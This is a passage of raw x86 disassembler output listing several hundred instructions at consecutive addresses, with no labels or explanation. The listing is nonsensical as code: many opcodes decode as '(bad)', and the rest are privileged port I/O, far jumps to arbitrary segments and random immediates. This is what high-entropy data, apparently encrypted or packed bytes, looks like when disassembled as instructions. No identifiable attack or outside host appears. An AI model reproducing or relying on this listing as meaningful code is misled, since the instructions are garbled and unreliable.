  41791d:	fmulp  st(6),st
  41791f:	retf   
  417920:	add    eax,0xd2eee2fc
  417925:	mov    bh,0xf2
  417927:	shl    DWORD PTR [ecx-0x4a1a362d],1
  41792d:	(bad)  
  41792e:	(bad)  
  417930:	mov    edi,0xbad3c9
  417935:	loopne 0x41790f
  417937:	add    ebx,edx
  417939:	ret    
  41793a:	(bad)  
  41793b:	out    0xcf,al
  41793d:	mul    ah
  41793f:	add    dh,cl
  417941:	(bad)  
  417943:	retf   
  417944:	mov    al,0xbc
  417946:	mov    esp,0xdadbecf4
  41794b:	retf   
  41794c:	in     eax,dx
  41794d:	aam    0xce
  41794f:	mov    edi,0xe1e9fed6
  417954:	ret    0xbefe
  417957:	call   eax
  417959:	add    al,0xb
  41795b:	cli    
  41795c:	fdivp  st(3),st
  41795e:	les    eax,FWORD PTR ds:0xc9b3f109
  417964:	rol    esi,0xe5
  417967:	test   ch,0xf7
  41796a:	repz clc 
  41796c:	jmp    0xdbbc:0xc9f9e9b5
  417973:	call   0xf63b3764
  417978:	or     eax,esi
  41797a:	idiv   esp
  41797c:	jmp    0xdc064360
  417981:	(bad)  
  417982:	jmp    0xf0aa:0xccc7c2b8
  417989:	lock mov al,0xd0
  41798c:	sar    bh,1
  41798e:	std    
  41798f:	aad    0xf1
  417991:	fucomp st(5)
  417993:	cld    
  417994:	std    
  417995:	cld    
  417996:	(bad)  
  417997:	fcomi  st,st(5)
  417999:	cld    
  41799a:	(bad)  
  41799b:	(bad)  
  41799c:	or     eax,DWORD PTR [ebx]
  41799e:	enter  0x2,0xcc
  4179a2:	rcr    ah,1
  4179a4:	jecxz  0x41795d
  4179a6:	ret    
  4179a7:	aad    0xe6
  4179a9:	shl    bl,0xeb
  4179ac:	idiv   DWORD PTR [esi-0x2e2e4910]
  4179b2:	sar    DWORD PTR [ebp-0xc010410],0x4
  4179b9:	xlat   BYTE PTR ds:[ebx]
  4179ba:	sti    
  4179bb:	enter  0x7dd,0xe6
  4179bf:	out    0xff,al
  4179c1:	les    edi,FWORD PTR [edi-0xd333c4e]
  4179c7:	leave  
  4179c8:	ret    0xf1ce
  4179cb:	mov    ebx,0xcad7d2cc
  4179d0:	not    cl
  4179d2:	aam    0xd5
  4179d4:	xlat   BYTE PTR ds:[ebx]
  4179d5:	in     eax,dx
  4179d6:	in     eax,0xd6
  4179d8:	(bad)  
  4179d9:	fdivr  st,st(1)
  4179db:	loopne 0x4179b6
  4179dd:	retf   
  4179de:	or     esp,ebp
  4179e0:	jmp    0xeed2:0xe8b3d8fe
  4179e7:	in     eax,dx
  4179e8:	cmc    
  4179e9:	ret    0xccd4
  4179ec:	leave  
  4179ed:	in     eax,0xd1
  4179ef:	leave  
  4179f0:	mov    ebp,0xd3c8c8ed
  4179f5:	ret    0x3e2
  4179f8:	add    al,0xfb
  4179fa:	sti    
  4179fb:	retf   0xe4d5
  4179fe:	in     al,dx
  4179ff:	jmp    0x417a04
  417a01:	clc    
  417a02:	mov    bl,0xbc
  417a04:	mov    dl,0xaf
  417a06:	jmp    0xe5d1:0xf3e1e7e6
  417a0d:	std    
  417a0e:	lds    edi,FWORD PTR [ebp-0x20204306]
  417a14:	jecxz  0x417a0d
  417a16:	(bad)  
  417a17:	stc    
  417a18:	add    al,ah
  417a1a:	rcr    eax,1
  417a1c:	add    edx,edi
  417a1e:	clc    
  417a1f:	out    0x12,eax
  417a21:	loopne 0x417a11
  417a23:	mov    edi,0xe9cfadf3
  417a28:	rcl    ah,0xc7
  417a2b:	in     al,0xd4
  417a2d:	rcr    ah,cl
  417a2f:	stc    
  417a30:	(bad)  
  417a32:	xlat   BYTE PTR ds:[ebx]
  417a33:	mov    edi,0xf5fae0cc
  417a38:	add    al,bh
  417a3a:	cld    
  417a3b:	jmp    0xfe403720
  417a40:	leave  
  417a41:	jecxz  0x4179fc
  417a43:	(bad)  
  417a44:	mov    bl,0xde
  417a46:	jmp    0xc7275f0e
  417a4b:	mov    ecx,0xb6dbcdf5
  417a50:	retf   
  417a51:	aad    0xcd
  417a53:	mov    esi,0xf4e1bece
  417a58:	out    0xf5,eax
  417a5a:	lock add dh,dl
  417a5d:	or     eax,0xe9d90ad5
  417a62:	loopne 0x417a5b
  417a64:	fnstsw WORD PTR [ebp-0x4e3f4354]
  417a6a:	loope  0x417a3d
  417a6c:	(bad)  
  417a6f:	mov    ah,0xd9
  417a71:	fst    st(1)
  417a73:	icebp  
  417a74:	fnstsw WORD PTR [ebp-0x5fc0942]
  417a7a:	std    
  417a7b:	in     al,0xcb
  417a7d:	in     eax,0xfd
  417a7f:	(bad)  
  417a80:	repz cld 
  417a82:	mov    esi,0xeebcf6b2
  417a87:	enter  0xf6e7,0xcb
  417a8b:	jmp    0x417a8c
  417a8d:	in     eax,0xc8
  417a8f:	sti    
  417a90:	out    dx,eax
  417a91:	cmc    
  417a92:	loope  0x417a7b
  417a94:	out    0x6,eax
  417a96:	pop    es
  417a97:	cli    
  417a98:	(bad)  
  417a99:	out    0xf9,al
  417a9b:	out    0xd6,eax
  417a9d:	(bad)  
  417a9e:	std    
  417a9f:	out    dx,eax
  417aa0:	jmp    0xf5e3:0xeae5aedf
  417aa7:	mov    cl,0xac
  417aa9:	out    dx,al
  417aaa:	repnz repnz cli 
  417aad:	fcmovu st,st(7)
  417aaf:	repnz mov ch,0xbd
  417ab2:	add    ah,bl
  417ab4:	loope  0x417a75
  417ab6:	out    0xbe,eax
  417ab8:	clc    
  417ab9:	ror    BYTE PTR [ebx],0xc1
  417abc:	jecxz  0x417a7e
  417abe:	fdivr  st,st(1)
  417ac0:	jmp    0xf3bc:0xd2aeaacd
  417ac7:	loopne 0x417a7f
  417ac9:	(bad)  
  417aca:	in     eax,dx
  417acb:	(bad)  
  417acc:	mov    ah,0xed
  417ace:	fldpi  
  417ad0:	int3   
  417ad1:	mov    al,0xfc
  417ad3:	loopne 0x417aa6
  417ad5:	(bad)  
  417ad6:	mov    edi,0xe1ffc7df
  417adb:	leave  
  417adc:	push   es
  417add:	(bad)  
  417adf:	cld    
  417ae0:	stc    
  417ae1:	(bad)
  417ae5:	loop   0x417a98
  417ae7:	jecxz  0x417ad5
  417ae9:	in     al,dx
  417aea:	call   0xd61662db
  417aef:	fnsave [ecx-0x6312434]
  417af5:	repz mov ecx,0x6d4cbea
  417afc:	out    dx,eax
  417afd:	out    dx,eax
  417afe:	or     eax,0xd9f80d01
  417b03:	fucomip st,st(3)
  417b05:	scas   eax,DWORD PTR es:[edi]
  417b06:	int3   
  417b07:	retf   
  417b08:	mov    bh,0xed
  417b0a:	lock (bad) 
  417b0c:	repz fsub st,st(4)
  417b0f:	lock call 0xd50a76e8
  417b15:	fsub   st,st(6)
  417b17:	stc    
  417b18:	icebp  
  417b19:	loopne 0x417ae5
  417b1b:	aad    0xcf
  417b1d:	clc    
  417b1e:	call   0xdf14680a
  417b23:	ror    eax,cl
  417b25:	xlat   BYTE PTR ds:[ebx]
  417b26:	(bad)  
  417b27:	lock shl edi,cl
  417b2a:	out    0xca,al
  417b2c:	les    esi,FWORD PTR [eax-0x2f371227]
  417b32:	add    al,al
  417b34:	add    dh,ah
  417b36:	loop   0x417b2d
  417b38:	add    bh,bh
  417b3a:	or     ebx,eax
  417b3c:	jmp    0x417b2d
  417b3e:	loop   0x417b21
  417b40:	std    
  417b41:	add    eax,ebx
  417b43:	xlat   BYTE PTR ds:[ebx]
  417b44:	scas   al,BYTE PTR es:[edi]
  417b45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b46:	jmp    0xcf3b2c21
  417b4b:	dec    esp
  417b4d:	mov    bh,0xbe
  417b4f:	shl    DWORD PTR [esp+edi*4-0x433d2649],cl
  417b56:	loop   0x417b15
  417b58:	ffree  st(4)
  417b5a:	retf   
  417b5b:	std    
  417b5c:	push   es
  417b5d:	fstp   st(2)
  417b5f:	call   0xaf0b6466
  417b64:	jmp    0xca26651f
  417b69:	int3   
  417b6a:	out    0xba,eax
  417b6c:	call   0xe33a565f
  417b71:	sti    
  417b72:	hlt    
  417b73:	(bad)  
  417b75:	repz (bad) 
  417b78:	loop   0x417b70
  417b7a:	retf   
  417b7b:	call   0xcb0c5b58
  417b80:	fild   WORD PTR [edi]
  417b82:	retf   0xd7e8
  417b85:	leave  
  417b86:	ret    
  417b87:	rol    dh,1
  417b89:	sti    
  417b8a:	hlt    
  417b8b:	iret   
  417b8c:	in     eax,dx
  417b8d:	fistp  QWORD PTR [ebp-0x2b162708]
  417b93:	add    dl,bh
  417b95:	idiv   bh
  417b97:	repz icebp 
  417b99:	stc    
  417b9a:	inc    BYTE PTR [edi]
  417b9c:	or     al,al
  417b9e:	(bad)  
  417b9f:	or     al,0xe5
  417ba1:	icebp  
  417ba2:	(bad)  
  417ba3:	call   0xee053376
  417ba8:	icebp  
  417ba9:	loop   0x417b95
  417bab:	iret   
  417bac:	aad    0xcb
  417bae:	fcmove st,st(2)
  417bb0:	fnstsw WORD PTR [edx+eax*8-0x2b281d44]
  417bb7:	clc    
  417bb8:	(bad)  
  417bb9:	jmp    0xd0363a99
  417bbe:	ret    
  417bbf:	fmulp  st(1),st
  417bc1:	loopne 0x417ba2
  417bc3:	mov    bl,0xbd
  417bc5:	(bad)  
  417bc6:	lods   al,BYTE PTR ds:[esi]
  417bc7:	xlat   BYTE PTR ds:[ebx]
  417bc8:	in     al,0xe1
  417bca:	mul    ah
  417bcc:	mov    al,0xf7
  417bce:	mov    edi,0xd2feedf3
  417bd3:	clc    
  417bd4:	xbegin 0x3c5495
  417bda:	(bad)  
  417bdb:	fcmovu st,st(2)
  417bdd:	iret   
  417bde:	(bad)  
  417be0:	pop    es
  417be1:	pop    es
  417be2:	loopne 0x417bd7
  417be4:	(bad)  
  417be5:	into   
  417be6:	loop   0x417bcd
  417be8:	div    esi
  417bea:	int    0xd1
  417bec:	idiv   DWORD PTR [ebx+0x1facbc5]
  417bf2:	int3   
  417bf3:	mov    edi,0xe2c60206
  417bf8:	shl    cl,0x0
  417bfb:	add    al,0xb
  417bfd:	retf   0xec0e
  417c00:	out    dx,eax
  417c01:	repnz out 0xb2,al
  417c04:	mov    ebp,0xacb3c0be
  417c09:	mov    edx,0xcecacfcd
  417c0e:	mov    dh,0xf7
  417c10:	mov    edi,0xb9d2f9f1
  417c15:	hlt    
  417c16:	vpsubusb xmm1,xmm4,XMMWORD PTR [ecx]
  417c1a:	fcmovu st,st(1)
  417c1c:	fsubrp st(1),st
  417c1e:	cmc    
  417c1f:	pop    es
  417c20:	enter  0xacfa,0xb8
  417c24:	out    0xf5,eax
  417c26:	jecxz  0x417bd6
  417c28:	mov    al,0xef
  417c2a:	mov    bh,0xd6
  417c2c:	idiv   ch
  417c2e:	hlt    
  417c2f:	int    0xee
  417c31:	ret    
  417c32:	(bad)  
  417c33:	(bad)  
  417c34:	iret   
  417c35:	rcl    edi,0x3
  417c38:	shl    ch,cl
  417c3a:	add    al,0x9
  417c3c:	xlat   BYTE PTR ds:[ebx]
  417c3d:	fucom  st(4)
  417c3f:	int    0xc9
  417c41:	in     eax,0xc7
  417c43:	mov    ebp,0xadeff5a5
  417c48:	leave  
  417c49:	lods   al,BYTE PTR ds:[esi]
  417c4a:	idiv   DWORD PTR [eax-0xa204a34]
  417c50:	jmp    0xdf:0xd3bed8ef
  417c57:	add    al,al
  417c59:	sar    bh,0xdb
  417c5c:	loopne 0x417c68
  417c5e:	(bad)  [esi]
  417c60:	jmp    0xe934595f
  417c65:	mov    al,0xb3
  417c67:	(bad)  
  417c68:	jmp    0x417c55
  417c6a:	icebp  
  417c6b:	mov    dl,0xf6
  417c6d:	cmc    
  417c6e:	int3   
  417c6f:	retf   
  417c70:	out    dx,al
  417c71:	cmc    
  417c72:	leave  
  417c73:	add    dl,dh
  417c75:	fsqrt  
  417c77:	fcomp  st(5)
  417c79:	(bad)  
  417c7a:	jecxz  0x417c5b
  417c7c:	aam    0xe2
  417c7e:	enter  0xd0a,0xec
  417c82:	repnz fst st(1)
  417c85:	retf   0xe3cc
  417c88:	aam    0xe5
  417c8a:	mov    ah,0xe7
  417c8c:	in     eax,dx
  417c8d:	retf   0xbdf0
  417c90:	repz (bad) 
  417c92:	fdivr  DWORD PTR [eax-0x7001d06]
  417c98:	loopne 0x417c74
  417c9a:	jecxz  0x417c79
  417c9c:	or     edi,edi
  417c9e:	enter  0x5d4,0x2
  417ca2:	mov    cl,0xad
  417ca4:	mov    dl,0xa4
  417ca6:	loop   0x417c9f
  417ca8:	jmp    0xff1d2c95
  417cad:	fnsave [ebp-0x45041c12]
  417cb3:	icebp  
  417cb4:	loopne 0x417c96
  417cb6:	idiv   dl
  417cb8:	(bad)  
  417cba:	out    0xcb,eax
  417cbc:	out    0xca,al
  417cbe:	or     ecx,edi
  417cc0:	add    cl,dh
  417cc2:	stos   DWORD PTR es:[edi],eax
  417cc3:	shr    ch,0xaf
  417cc6:	retf   0xf5f5
  417cc9:	int3   
  417cca:	mov    ecx,0xbffbbab8
  417ccf:	ffree  st(3)
  417cd1:	add    ecx,eax
  417cd3:	pop    es
  417cd4:	pop    es
  417cd5:	ret    
  417cd6:	pop    es
  417cd7:	jmp    0x417ccc
  417cd9:	inc    BYTE PTR [ebx]
  417cdb:	les    eax,FWORD PTR [ebp*8-0x2c033532]
  417ce2:	fild   QWORD PTR [edx-0x12381838]
  417ce8:	out    dx,al
  417ce9:	repz sar BYTE PTR [edx-0x7490030],cl
  417cf0:	mov    eax,0xe0dcd5dc
  417cf5:	into   
  417cf6:	fstp   st(1)
  417cf8:	hlt    
  417cf9:	rcr    esi,0xc7
  417cfc:	or     ebp,ebp
  417cfe:	add    BYTE PTR [eax],al
  417d00:	fxam   
  417d02:	mov    edi,0xf5a4e0a9
  417d07:	(bad)  
  417d08:	icebp  
  417d09:	iret   
  417d0a:	cmc    
  417d0b:	fnstcw WORD PTR [edx-0x14353738]
  417d11:	std    
  417d12:	jecxz  0x417d17
  417d14:	out    0xfa,al
  417d16:	stc    
  417d17:	mov    ebp,0xffdc1bc
  417d1c:	out    0xea,al
  417d1e:	stc    
  417d1f:	push   cs
  417d20:	jmp    0x417d20
  417d22:	mov    eax,0xcee6bdc3
  417d27:	(bad)  
  417d28:	hlt    
  417d29:	rcl    ecx,0xf3
  417d2c:	mov    edx,0xdef6eeeb
  417d31:	ret    0xe8bb
  417d34:	loopne 0x417d09
  417d36:	fneni(8087 only) 
  417d38:	in     eax,0xdf
  417d3a:	faddp  st(0),st
  417d3c:	cli    
  417d3d:	add    ah,al
  417d3f:	fiadd  WORD PTR [esi]
  417d41:	retf   0xe7a7
  417d44:	call   0xe2332a05
  417d49:	in     eax,0xb2
  417d4b:	mov    bh,0xe7
  417d4d:	aad    0xed
  417d4f:	mov    edx,0xdec3c8d2
  417d54:	(bad)  
  417d56:	add    edx,ebx
  417d58:	add    esp,edx
  417d5a:	out    0xe4,al
  417d5c:	fadd   st,st(0)
  417d5e:	iret   
  417d5f:	into   
  417d60:	std    
  417d61:	cli    
  417d62:	out    dx,eax
  417d63:	repz icebp 
  417d65:	scas   eax,DWORD PTR es:[edi]
  417d66:	loope  0x417d56
  417d68:	loop   0x417d24
  417d6a:	in     eax,dx
  417d6b:	repnz rcl esp,1
  417d6e:	aam    0xf3
  417d70:	out    dx,eax
  417d71:	neg    edi
  417d73:	out    dx,al
  417d74:	hlt    
  417d75:	fadd   st,st(2)
  417d77:	out    0xe5,eax
  417d79:	or     ebp,esp
  417d7b:	jmp    0xc61b767f
  417d80:	adc    eax,DWORD PTR [edx]
  417d82:	ret    
  417d83:	mov    esp,0xd7c0f5e3
  417d88:	loopne 0x417d85
  417d8a:	(bad)  
  417d8b:	rcr    bh,cl
  417d8d:	int3   
  417d8e:	mov    ch,0xef
  417d90:	idiv   DWORD PTR [ebp+0x3f401fb]
  417d96:	aad    0xd8
  417d98:	add    edx,ebp
  417d9a:	mov    edi,0xd90fc9f5
  417d9f:	sti    
  417da0:	fisttp QWORD PTR ds:0xcdc3f7bc
  417da6:	mov    bl,0xca
  417da8:	mov    dl,0xeb
  417daa:	hlt    
  417dab:	out    dx,eax
  417dac:	out    dx,eax
  417dad:	aam    0xbe
  417daf:	shl    edx,cl
  417db1:	sti    
  417db2:	fsub   st(4),st
  417db4:	(bad)  
  417db6:	rol    ecx,cl
  417db8:	fcmovnb st,st(3)
  417dba:	ret    0xf6c6
  417dbd:	out    dx,eax
  417dbe:	push   cs
  417dbf:	or     al,0xca
  417dc1:	int    0xd1
  417dc3:	(bad)  
  417dc5:	mov    al,0xaf
  417dc7:	out    0xee,eax
  417dc9:	mov    al,0xd2
  417dcb:	mov    dh,0xb1
  417dcd:	out    0xb9,al
  417dcf:	leave  
  417dd0:	aad    0xb8
  417dd2:	add    edx,esi
  417dd4:	repz test BYTE PTR [ebx],0xf8
  417dd8:	inc    esp
  417dda:	retf   0xe3f8
  417ddd:	push   cs
  417dde:	aad    0xc4
  417de0:	stc    
  417de1:	(bad)  
  417de2:	lock shl cl,1
  417de5:	int    0xb3
  417de7:	(bad)
  417dea:	cmc    
  417deb:	sar    dl,0xed
  417dee:	fcmovnu st,st(0)
  417df0:	cmc    
  417df1:	mov    ebx,0xffdef1f1
  417df6:	xlat   BYTE PTR ds:[ebx]
  417df7:	or     ebp,edx
  417df9:	aam    0xc5
  417dfb:	ret    0xf4fd
  417dfe:	pop    es
  417dff:	add    ah,ch
  417e01:	out    0xbc,eax
  417e03:	rcr    ebp,cl
  417e05:	int3   
  417e06:	lock mov ch,0xdb
  417e09:	test   dl,0xfa
  417e0c:	mov    cl,0xe8
  417e0e:	fdiv   st(4),st
  417e10:	div    bl
  417e12:	int    0xbc
  417e14:	(bad)  
  417e15:	sti    
  417e16:	ret    0xd106
  417e19:	(bad)  
  417e1a:	jmp    0x417e26
  417e1c:	in     eax,0xc4
  417e1e:	cmc    
  417e1f:	loop   0x417e1b
  417e21:	(bad)  
  417e23:	ror    ecx,cl
  417e25:	mov    dl,0xae
  417e27:	hlt    
  417e28:	repnz sti 
  417e2a:	shl    ebp,1
  417e2c:	out    0xd7,eax
  417e2e:	repnz shl edx,1
  417e31:	into   
  417e32:	jmp    0xda0e7e16
  417e37:	add    eax,edx
  417e39:	(bad)  
  417e3a:	std    
  417e3b:	retf   0xe203
  417e3e:	fucomip st,st(2)
  417e40:	push   cs
  417e41:	call   0xb7005616
  417e46:	(bad)  
  417e47:	loopne 0x417e29
  417e49:	mov    ah,0xb1
  417e4b:	enter  0xdad8,0xde
  417e4f:	enter  0xc2c3,0xdc
  417e53:	int    0xdc
  417e55:	mov    esp,0xf7e7bdf2
  417e5a:	loope  0x417e59
  417e5c:	les    eax,FWORD PTR ds:0xd9e3f3cf
  417e62:	(bad)  
  417e64:	mov    al,0xe4
  417e66:	mov    dl,0xb3
  417e68:	(bad)  
  417e69:	loopne 0x417e5a
  417e6b:	mov    ch,0xce
  417e6d:	(bad)  
  417e6e:	sar    ebx,1
  417e70:	in     eax,dx
  417e71:	jecxz  0x417e75
  417e73:	into   
  417e74:	in     al,dx
  417e75:	out    0xd4,al
  417e77:	(bad)  
  417e78:	add    ebp,ebx
  417e7a:	or     eax,edi
  417e7c:	(bad)  
  417e7d:	out    dx,eax
  417e7e:	jmp    0xaa4c6149
  417e83:	iret   
  417e84:	enter  0xf6e4,0xc7
  417e88:	ror    eax,cl
  417e8a:	sti    
  417e8b:	lock mov ah,0xe5
  417e8e:	sti    
  417e8f:	fnstenv [edx+esi*8-0x4091044]
  417e96:	lock loopne 0x417e7e
  417e99:	add    eax,0xd4cfc002
  417e9e:	add    eax,esi
  417ea0:	(bad)  
  417ea3:	shl    esi,0xb6
  417ea6:	enter  0xc3cd,0xf1
  417eaa:	neg    dl
  417eac:	mov    ebx,0xcdd8fcfd
  417eb1:	cld    
  417eb2:	mov    eax,0x2e6f6f3
  417eb7:	stc    
  417eb8:	loope  0x417eb3
  417eba:	(bad)
  417ebd:	add    bl,al
  417ebf:	in     eax,dx
  417ec0:	retf   
  417ec1:	push   ebx
  417ec3:	icebp  
  417ec4:	out    0xe8,al
  417ec6:	out    0xf0,al
  417ec8:	mov    bl,0xed
  417eca:	xlat   BYTE PTR ds:[ebx]
  417ecb:	in     eax,dx
  417ecc:	retf   0xe4ec
  417ecf:	call   0xd94279ce
  417ed4:	in     eax,dx
  417ed5:	clc    
  417ed6:	int    0xf0
  417ed8:	fcmovb st,st(5)
  417eda:	fild   DWORD PTR [ecx]
  417edc:	(bad)  
  417edd:	jmp    ebp
  417edf:	jmp    0xec075bb1
  417ee4:	shl    dl,0xc2
  417ee7:	loop   0x417eab
  417ee9:	mov    cl,0xd5
  417eeb:	retf   0xddf4
  417eee:	in     al,0xdd
  417ef0:	ror    edi,cl
  417ef2:	clc    
  417ef3:	rcr    dh,0xfd
  417ef6:	icebp  
  417ef7:	(bad)  
  417ef8:	(bad)  
  417efa:	call   0xe71b7ae7
  417eff:	in     eax,dx
  417f00:	add    eax,0xcbaff2ef
  417f05:	div    ch
  417f07:	mov    cl,0xe3
  417f09:	iret   
  417f0a:	aad    0xda
  417f0c:	in     al,dx
  417f0d:	in     eax,dx
  417f0e:	clc    
  417f0f:	fnstsw WORD PTR [edx-0x25432403]
  417f15:	lock (bad) 
  417f18:	fcmovnbe st,st(4)
  417f1a:	out    0xe0,al
  417f1c:	jmp    0x417ef2
  417f1e:	retf   0xdfd4
  417f21:	(bad)  
  417f23:	scas   eax,DWORD PTR es:[edi]
  417f24:	loopne 0x417f03
  417f26:	shr    BYTE PTR [esi-0x3b330f18],cl
  417f2c:	aad    0xeb
  417f2e:	mov    dh,0xf9
  417f30:	cld    
  417f31:	mov    esp,0xecedbfcc
  417f36:	rcl    edx,1
  417f38:	or     esi,ebp
  417f3a:	(bad)  
  417f3b:	(bad)  
  417f3d:	in     eax,dx
  417f3e:	out    0xe8,eax
  417f40:	repz fcmovu st,st(7)
  417f43:	stos   BYTE PTR es:[edi],al
  417f44:	in     eax,dx
  417f45:	out    dx,eax
  417f46:	mov    dl,0xb6
  417f48:	mov    dl,0xd9
  417f4a:	call   0xef065637
  417f4f:	in     al,0xf0
  417f51:	mov    al,0xfd
  417f53:	add    dh,cl
  417f55:	mov    ah,0x3
  417f57:	stc    
  417f58:	(bad)  
  417f59:	mul    eax
  417f5b:	fucomi st,st(6)
  417f5d:	fisttp QWORD PTR [ebx]
  417f5f:	jmp    0xc91e6f44
  417f64:	out    dx,eax
  417f65:	retf   0xece7
  417f68:	shl    eax,cl
  417f6a:	call   0xf2083a2a
  417f6f:	repz sar BYTE PTR [esi-0x121f2833],1
  417f76:	in     al,dx
  417f77:	clc    
  417f78:	(bad)  
  417f79:	rol    BYTE PTR ds:0xfce60005,0xc6
  417f80:	(bad)  
  417f82:	mov    bl,0xd7
  417f84:	mov    bh,0xcb
  417f86:	stos   DWORD PTR es:[edi],eax
  417f87:	retf   
  417f88:	fucompp 
  417f8a:	scas   eax,DWORD PTR es:[edi]
  417f8b:	enter  0xffea,0xda
  417f8f:	std    
  417f90:	add    cl,dl
  417f92:	rol    DWORD PTR [edx],cl
  417f94:	mov    esi,0xd1f4f0fe
  417f99:	jmp    0xfb378a83
  417f9e:	stc    
  417f9f:	(bad)  
  417fa1:	loope  0x417f69
  417fa3:	leave  
  417fa4:	mov    esp,0xf4f0c3c9
  417fa9:	jmp    0x417fa3
  417fab:	mov    eax,0xeacbf6f6
  417fb0:	out    dx,al
  417fb1:	loope  0x417f80
  417fb3:	sti    
  417fb4:	repz int3 
  417fb6:	stc    
  417fb7:	sar    DWORD PTR [edx+eax*1+0xbdec0f6],0xd5
  417fbf:	(bad)  
  417fc1:	(bad)  
  417fc3:	ret    0xccdd
  417fc6:	ret    
  417fc7:	repnz repz div DWORD PTR [eax-0x439454c]
  417fcf:	shr    ebx,1
  417fd1:	retf   0xe0dc
  417fd4:	sar    BYTE PTR [edi-0x25422c2e],1
  417fda:	push   es
  417fdb:	fcmove st,st(3)
  417fdd:	jmp    0xdf484cb0
  417fe2:	jmp    0xc4ef:0xb0f7acd8
  417fe9:	out    0xba,al
  417feb:	shl    BYTE PTR [edi+edx*8-0x31044a25],1
  417ff2:	fxch   st(0)
  417ff4:	(bad)  
  417ff6:	fpatan 
  417ff8:	(bad)  
  417ffa:	loope  0x417ff8
  417ffc:	cli    
  417ffd:	hlt    
  417ffe:	or     eax,DWORD PTR [esi]
  418000:	jmp    0x418014
  418002:	ret    0xcaad
  418005:	call   0xa93d65de
  41800a:	mov    ah,0xb4
  41800c:	aam    0xd1
  41800e:	(bad)  
  418010:	fdivr  st,st(7)
  418012:	mov    esi,0xfdcecfdf
  418017:	mul    ah
  418019:	pop    es
  41801a:	fidivr DWORD PTR [esi-0x21011e22]
  418020:	push   cs
  418021:	out    0xae,eax
  418023:	(bad)  
  418024:	mul    dh
  418026:	enter  0xe6bc,0xed
  41802a:	mov    edx,0xb7f6bac9
  41802f:	mov    ecx,0x1ccf2
  418034:	out    dx,eax
  418035:	pop    es
  418036:	clc    
  418037:	aam    0xff
  418039:	(bad)  
  41803a:	(bad)  
  41803b:	xlat   BYTE PTR ds:[ebx]
  41803c:	cld    
  41803d:	retf   
  41803e:	retf   
  41803f:	add    eax,0xccaaccc8
  418044:	(bad)  
  418045:	out    0xe9,al
  418047:	leave  
  418048:	icebp  
  418049:	(bad)  
  41804a:	(bad)  
  41804c:	out    0xe8,eax
  41804e:	std    
  41804f:	hlt    
  418050:	jmp    0x418040
  418052:	sar    DWORD PTR [edi-0x3c272f1f],1
  418058:	(bad)  
  418059:	shl    dh,0xe7
  41805c:	sti    
  41805d:	or     BYTE PTR [eax],cl
  41805f:	fcmovne st,st(1)
  418061:	add    eax,0xc1b2dfd1
  418066:	fucomp st(6)
  418068:	into   
  418069:	in     al,0xd1
  41806b:	div    ch
  41806d:	int3   
  41806e:	(bad)  
  418071:	mov    edx,0xe2d7f803
  418076:	mov    esp,0xc9ddd9ba
  41807b:	fild   WORD PTR [ecx]
  41807d:	out    0xfd,al
  41807f:	(bad)
  418082:	lods   al,BYTE PTR ds:[esi]
  418083:	loopne 0x418062
  418085:	mov    dh,0xad
  418087:	retf   0xc6fb
  41808a:	leave  
  41808b:	shr    cl,cl
  41808d:	mov    al,0xe9
  41808f:	sar    DWORD PTR [edi-0x27452407],1
  418095:	std    
  418096:	mov    ebx,0xc1030aeb
  41809b:	loope  0x4180a7
  41809d:	in     eax,dx
  41809e:	fisttp QWORD PTR [ecx]
  4180a0:	or     eax,0xdec1b80c
  4180a5:	shl    esp,0xfb
  4180a8:	out    dx,eax
  4180a9:	mov    edx,0xbab1d1d3
  4180ae:	(bad)
  4180b1:	sar    ah,1
  4180b3:	add    edx,ebx
  4180b5:	loope  0x4180b3
  4180b7:	aam    0xb9
  4180b9:	in     eax,0xfe
  4180bb:	mov    BYTE PTR [esi],0xdd
  4180be:	cmc    
  4180bf:	or     bl,cl
  4180c1:	(bad)  
  4180c3:	mov    esp,0xd4c1e4cc
  4180c8:	call   0xf10c6b7e
  4180cd:	mov    edx,0xf2eeefe4
  4180d2:	mov    ebx,0x1dac1da
  4180d7:	cmc    
  4180d8:	(bad)  
  4180d9:	jmp    0xfe2b45df
  4180de:	aam    0xc9
  4180e0:	call   0xe42563ee
  4180e5:	shl    edi,1
  4180e7:	jmp    0xc5aad
  4180ec:	(bad)  
  4180ee:	(bad)
  4180f1:	sar    DWORD PTR [ebx-0x1c0d2b05],cl
  4180f7:	(bad)  
  4180f9:	repnz mov DWORD PTR [ecx],0xd9e5c5dc
  418100:	or     eax,esp
  418102:	shr    esp,1
  418104:	mov    bh,0xcf
  418106:	(bad)  
  418107:	out    0xf3,eax
  418109:	mov    cl,0xf2
  41810b:	jmp    0xcafb:0xf4e4d5d9
  418112:	shl    DWORD PTR [esi-0x13202e23],1
  418118:	shl    dh,cl
  41811a:	(bad)
  41811d:	retf   0xe3c9
  418120:	in     al,dx
  418121:	jecxz  0x4180e4
  418123:	lock (bad) [edi-0x30352c10]
  41812a:	aad    0xdf
  41812c:	(bad)  
  41812d:	jmp    0x1fb381a
  418132:	mov    edx,0xdec6f2bc
  418137:	jecxz  0x418118
  418139:	clc    
  41813a:	out    0xdc,eax
  41813c:	aad    0xcf
  41813e:	jmp    0x41812a
  418140:	call   0xaeea6c52
  418145:	lock leave 
  418147:	jmp    0xd21a753e
  41814c:	lock (bad) 
  41814e:	cmc    
  41814f:	mov    ecx,0x2bad8bb
  418154:	sar    cl,cl
  418156:	out    0xf4,eax
  418158:	(bad)  
  41815a:	fadd   DWORD PTR ds:0xe5c9fec4
  418160:	fucomip st,st(7)
  418162:	fucomip st,st(7)
  418164:	(bad)  
  418166:	jmp    0xc60f335a
  41816b:	(bad)  
  41816d:	lods   al,BYTE PTR ds:[esi]
  41816e:	mov    ah,0xbd
  418170:	loop   0x41816f
  418172:	rcl    ebp,cl
  418174:	cli    
  418175:	fdiv   st(0),st
  418177:	rol    DWORD PTR [edi+ebx*8],0xca
  41817b:	loopne 0x418147
  41817d:	in     al,0xed
  41817f:	std    
  418180:	or     ah,ah
  418182:	int    0xd0
  418184:	jecxz  0x41814e
  418186:	repnz fneni(8087 only) 
  418189:	mov    dl,0xd4
  41818b:	in     eax,dx
  41818c:	retf   0xebc5
  41818f:	out    dx,al
  418190:	icebp  
  418191:	sti    
  418192:	repnz jecxz 0x418167
  418195:	fiadd  WORD PTR [edi]
  418197:	out    0xf1,eax
  418199:	jecxz  0x41819a
  41819b:	cli    
  41819c:	out    0xdd,eax
  41819e:	loopne 0x41819e
  4181a0:	leave  
  4181a1:	or     eax,0xd2aee6d9
  4181a6:	icebp  
  4181a7:	shl    esp,cl
  4181a9:	loope  0x418181
  4181ab:	hlt    
